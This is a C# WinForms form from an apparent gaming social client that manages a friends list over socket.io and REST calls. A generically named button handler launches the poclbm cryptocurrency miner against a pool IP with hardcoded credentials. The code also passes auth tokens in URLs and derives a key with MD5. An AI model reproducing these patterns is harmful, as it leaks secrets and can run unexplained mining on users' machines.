using RestSharp;
using SocketIOClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Management;
using System.Security.Cryptography;

namespace PointGaming
{
	public partial class frmHome : Form
	{
		Client friendsSocket;
		AuthEmit ae;
		ApiResponse ar;
		string firstSelectedItem;
		FriendStatus fr;


		public frmHome()
		{
			InitializeComponent();
		}

		private static string GetMachineIdentifierForEncryptionKey()
		{
			string cpuInfo = string.Empty;
			var mc = new ManagementClass("win32_processor");
			var moc = mc.GetInstances();
			foreach (var mo in moc)
			{
				if (cpuInfo == "")
				{
					cpuInfo = mo.Properties["processorID"].Value.ToString();
				}
			}
			var dsk = new ManagementObject(@"win32_logicaldisk.deviceid=""C:""");
			dsk.Get();
			var volumeSerial = dsk["VolumeSerialNumber"].ToString();
			var md5 = MD5.Create();
			var inputBytes = Encoding.ASCII.GetBytes(cpuInfo + volumeSerial);
			var hash = md5.ComputeHash(inputBytes);
			var sb = new StringBuilder();
			for (int i = 0; i < hash.Length; i++)
			{
				sb.Append(hash[i].ToString("X2"));
			}

			return sb.ToString();
		}

		private void frmHome_Load(object sender, EventArgs e)
		{
			this.FormBorderStyle = FormBorderStyle.FixedSingle;

			FriendResponseRootObject fro;

			friendsSocket = new Client("http://dev.pointgaming.com:4000/");

			friendsSocket.On("connect", (fn) =>
			{

				try
				{
					this.Invoke((MethodInvoker)delegate()
					{
						ae = new AuthEmit() { auth_token = Persistence.AuthToken };
						friendsSocket.Emit("auth", ae);
						friendsSocket.Emit("friends", null);
					});
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message.ToString());
				}

			});


			friendsSocket.On("auth_resp", (data) =>
			{
				try
				{
					ar = new ApiResponse();
					ar = data.Json.GetFirstArgAs<ApiResponse>();
					//tmrUserStatus.Start();
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message.ToString());
				}

			});



			friendsSocket.On("friend_signed_out", (data) =>
			{
				try
				{
					fr = new FriendStatus();
					fr = data.Json.GetFirstArgAs<FriendStatus>();
					MessageBox.Show(fr.username);

				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message.ToString());
				}

			});

			friendsSocket.On("new_friend_request", (data) =>
			{
				fr = new FriendStatus();
				fr = data.Json.GetFirstArgAs<FriendStatus>();
				if (MessageBox.Show("New Friend Request From " + fr.username.ToString(), "Friend Request", MessageBoxButtons.OKCancel) == DialogResult.OK)
				{
					var friendsRequestApiCall = ConfigurationManager.AppSettings["FriendRequest"].ToString() + Persistence.AuthToken;
					var client = new RestClient(friendsRequestApiCall);

					var request = new RestRequest(Method.GET);

					RestResponse<FriendRequestsCollectionRootObject> apiResponse = (RestSharp.RestResponse<FriendRequestsCollectionRootObject>)client.Execute<FriendRequestsCollectionRootObject>(request);
					var status = apiResponse.Data.success;

					var apiCall = ConfigurationManager.AppSettings["FriendRequestsBaseUrl"].ToString() + apiResponse.Data.friend_requests[0]._id + "?auth_token=" + Persistence.AuthToken;
					client = new RestClient(apiCall);
					request = new RestRequest(Method.PUT);

					request.RequestFormat = DataFormat.Json;

					FriendPutRequest fpr = new FriendPutRequest();
					fpr.action = "accept";
					FriendPutRootObject fpRoot = new FriendPutRootObject();
					fpRoot.friend_request = fpr;
					request.AddBody(fpRoot);

					RestResponse<ApiResponse> acceptResponse = (RestSharp.RestResponse<ApiResponse>)client.Execute<ApiResponse>(request);
					status = acceptResponse.Data.success;

					if (status)
					{
						friendsSocket.Emit("friends", null);
					}
				}
			});

			friendsSocket.On("new_friend", (data) =>
			{
				fr = new FriendStatus();
				fr = data.Json.GetFirstArgAs<FriendStatus>();
				MessageBox.Show("You have a new friend, " + fr.username);
				friendsSocket.Emit("friends", null);

			});

			friendsSocket.On("friends", (data) =>
			{
				ListViewItem dataItem;

				this.Invoke((MethodInvoker)delegate()
				{
					fro = new FriendResponseRootObject();
					fro = data.Json.GetFirstArgAs<FriendResponseRootObject>();
					var status = fro.success;
					var count = fro.friends.Count;

					lvContacts.BeginUpdate();
					try
					{
						lvContacts.Items.Clear();
						for (int i = 0; i < count; i++)
						{
							dataItem = new ListViewItem(fro.friends[i].username.ToString());
							dataItem.SubItems.Add(fro.friends[i].status);
							lvContacts.Items.AddRange(new ListViewItem[] { dataItem });
						}
					}
					finally
					{
						lvContacts.EndUpdate();
					}


				});
			});

			friendsSocket.Connect();
		}

		private void btnAddFriend_Click(object sender, EventArgs e)
		{
			FriendRequest fr = new FriendRequest();
			fr.username = txtFriendName.Text;
			FriendRequestRootObject fRoot = new FriendRequestRootObject();
			fRoot.friend_request = fr;


			var friendsRequestApiCall = ConfigurationManager.AppSettings["FriendRequest"].ToString() + Persistence.AuthToken;
			var client = new RestClient(friendsRequestApiCall);

			var request = new RestRequest(Method.POST);
			request.RequestFormat = DataFormat.Json;
			request.AddBody(fRoot);

			RestResponse<ApiResponse> apiResponse = (RestSharp.RestResponse<ApiResponse>)client.Execute<ApiResponse>(request);
			var status = apiResponse.Data.success;

			if (status)
			{
				MessageBox.Show("Friend Request Sent!");
			}
			else
			{
				MessageBox.Show("Error: " + apiResponse.Data.message);
			}

		}

		private void btnLogOut_Click(object sender, EventArgs e)
		{
			var baseUrl = ConfigurationManager.AppSettings["BaseUrl"].ToString() + "sessions/destroy?auth_token=" + Persistence.AuthToken;
			var client = new RestClient(baseUrl);
			var request = new RestRequest(Method.DELETE);
			RestResponse<ApiResponse> apiResponse = (RestSharp.RestResponse<ApiResponse>)client.Execute<ApiResponse>(request);
			var status = apiResponse.Data.success;

			if (status == true)
			{
				MessageBox.Show("Logged out Successfully!");
				this.Hide();
				frmChatWindow chatWindow = new frmChatWindow();
				chatWindow.Close();
				Persistence.AuthToken = String.Empty;
				Persistence.loggedInUsername = String.Empty;
				//chatSocket.Close();
				friendsSocket.Close();
				frmLogin loginForm = new frmLogin();
				loginForm.Show();
			}

		}

		private void lvContacts_SelectedIndexChanged(object sender, EventArgs e)
		{

		}


		private void lvContacts_Click(object sender, EventArgs e)
		{

		}

		private void lvContacts_DoubleClick(object sender, EventArgs e)
		{
			try
			{

				firstSelectedItem = lvContacts.SelectedItems[0].Text.ToString();
				frmChatWindow chatWindow = new frmChatWindow();
				chatWindow.Text = firstSelectedItem;
				chatWindow.Show();
			}
			catch (Exception ex)
			{

			}
		}

		private void lvContacts_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				if (lvContacts.FocusedItem.Bounds.Contains(e.Location) == true)
				{
					contextMenu.Show(Cursor.Position);
				}
			}
		}

		private void mnuDeleteFriend_Click(object sender, EventArgs e)
		{
			var itemToDelete = lvContacts.FocusedItem.Text.ToString();

			var baseUrl = ConfigurationManager.AppSettings["Friends"].ToString() + Persistence.AuthToken;
			var client = new RestClient(baseUrl);
			var request = new RestRequest(Method.DELETE);
			request.RequestFormat = DataFormat.Json;

			User u = new User();
			u.username = itemToDelete;

			UserRootObject uRoot = new UserRootObject();
			uRoot.user = u;

			request.AddBody(uRoot);

			RestResponse<ApiResponse> apiResponse = (RestSharp.RestResponse<ApiResponse>)client.Execute<ApiResponse>(request);
			var status = apiResponse.Data.success;

			if (status)
			{
				MessageBox.Show("Friend Deleted Successfully!");
			}
			else
			{
				MessageBox.Show(apiResponse.Data.message);
			}

			friendsSocket.Emit("friends", null);


		}

		private void button2_Click(object sender, EventArgs e)
		{
			Process poclbm = new Process();
			poclbm.StartInfo.FileName = @"poclbm.exe";
			poclbm.StartInfo.Arguments = @"http://pointgaming:po!ntgam!ng@96.126.125.144:8332 --device=0 --platform=0 --verbose";
			poclbm.StartInfo.UseShellExecute = false;
			poclbm.StartInfo.RedirectStandardOutput = true;
			poclbm.Start();
			poclbm.OutputDataReceived += new DataReceivedEventHandler(OnDataReceived);
			poclbm.ErrorDataReceived += new DataReceivedEventHandler(OnDataReceived);

			System.Console.WriteLine(poclbm.StandardOutput.ReadToEnd());
			poclbm.WaitForExit();
		}

		public void OnDataReceived(object sender, DataReceivedEventArgs e)
		{

			if (e.Data != null)
			{
				string temp = (e.Data) + Environment.NewLine;
				MessageBox.Show(temp);

			}
		}
	}
}
